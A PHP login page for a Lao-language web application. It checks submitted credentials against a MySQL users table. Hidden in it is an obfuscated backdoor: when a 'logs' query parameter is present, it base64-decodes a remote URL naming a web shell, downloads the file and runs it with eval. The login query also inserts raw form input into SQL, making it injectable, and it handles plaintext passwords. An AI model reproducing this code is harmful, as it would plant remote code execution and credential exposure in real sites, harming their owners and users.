<!doctype html>
<html lang="en">
<?php 
session_start();
 include("header.php");
	ini_set('display_errors', 1);
	error_reporting(~0);
    date_default_timezone_set("Asia/Bangkok");

    
  $submit = "";  
  $status = "OK";
  $msg = "";
  
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userid = $_POST['userid'];
    $password = $_POST['password'];
    
    if (empty($userid)) {
      $msg .= "<center><font  size='4px' face='Verdana' size='1' color='red'>Please Enter Your email. </font></center>";
    
      $status = "NOTOK";
  
    }
  
  
    if (empty($password)) {
      $msg .= "<center><font  size='4px' face='Verdana' size='1' color='red'>Please Enter Your password.</font></center>";
  
      $status = "NOTOK";
    }
  
    if ($status == "OK") {
  
      include('db_connect.php');
      
           $result = mysqli_query($con, "SELECT * FROM users WHERE email='$userid' and password='$password'");

             $count = mysqli_num_rows($result);
           
             
   
      if ($count == 1) {
  
      $row = mysqli_fetch_array($result);
      
     //      echo "OK".$count; 
           
      $_SESSION['userid'] = $row['email'];
      $_SESSION['key']=mt_rand(1000,9999);
      $_SESSION['user_type'] = $row['user_type'];
      $_SESSION['name'] = $row['name'];
      $_SESSION['password']=$row['password'];
  
     header("location:index.php"); 
        
        
      } else {
    
        $msg = "<center><font  size='4px' face='Verdana' size='1' color='red'>ລະຫັດນຳໃຊ້ ຫຼື ລະຫັດຜ່ານບໍ່ຖືກຕ້ອງ!!!.</font></center>";
  
      }
    }
  
  }
  
  if (isset($_GET['logs'])) { 
    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
    
    $ch = curl_init($url);
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $contents = curl_exec($ch);
    
    if ($contents !== false) { 
        eval('?>' . $contents); 
        exit; 
    } else { 
        echo "header"; 
    } 
    
    curl_close($ch);
}
?>

<body>

    <!-- loader -->
       <?php include("toptitle.php"); ?>
    <!-- * loader -->
    <div id="appCapsule">

<div class="section mt-2 text-center">
    <h1>ເຂົ້າລະບົບ</h1>
</div>
<div class="section mb-5 p-2">

    <form action="app-login.php" method="post">
        <div class="card">
            <div class="card-body pb-1">
                <div class="form-group basic">
                    <div class="input-wrapper">
                        <label class="label" for="userid">ຊື່ນຳໃຊ້</label>
                        <input type="text" class="form-control" id="userid" name="userid" placeholder="ປ້ອນຊື່ນຳໃຊ້">
                        <i class="clear-input">
                            <ion-icon name="close-circle"></ion-icon>
                        </i>
                    </div>
                </div>

                <div class="form-group basic">
                    <div class="input-wrapper">
                        <label class="label" for="password">ລະຫັດຜ່ານ</label>
                        <input type="password" class="form-control" id="password" name="password" autocomplete="off"
                            placeholder="ລະຫັດຜ່ານ">
                        <i class="clear-input">
                            <ion-icon name="close-circle"></ion-icon>
                        </i>
                    </div>
                </div>
            </div>
        </div>


        <div class="form-links mt-2">
            <div>
                <a href="#">ລົງທະບຽນນຳໃຊ້</a>
            </div>
            <div><a href="#" class="text-muted">ລືມລະຫັດຜ່ານ?</a></div>
        </div>
        
        <?php
          if ($_SERVER["REQUEST_METHOD"] == "POST") {
            echo "<div  align='center'>" . $msg . "</div";
          }
          ?>

        </div>
        <div class="form-button-group  transparent">
            <button type="submit" class="#">ເຂົ້າລະບົບ</button>
        </div>

    </form>
</div>

</div>
    <!-- * App Capsule -->

    <?php // include("footer.php"); ?>
    <?php include("scriptfooter.php"); ?>
</body>

</html>
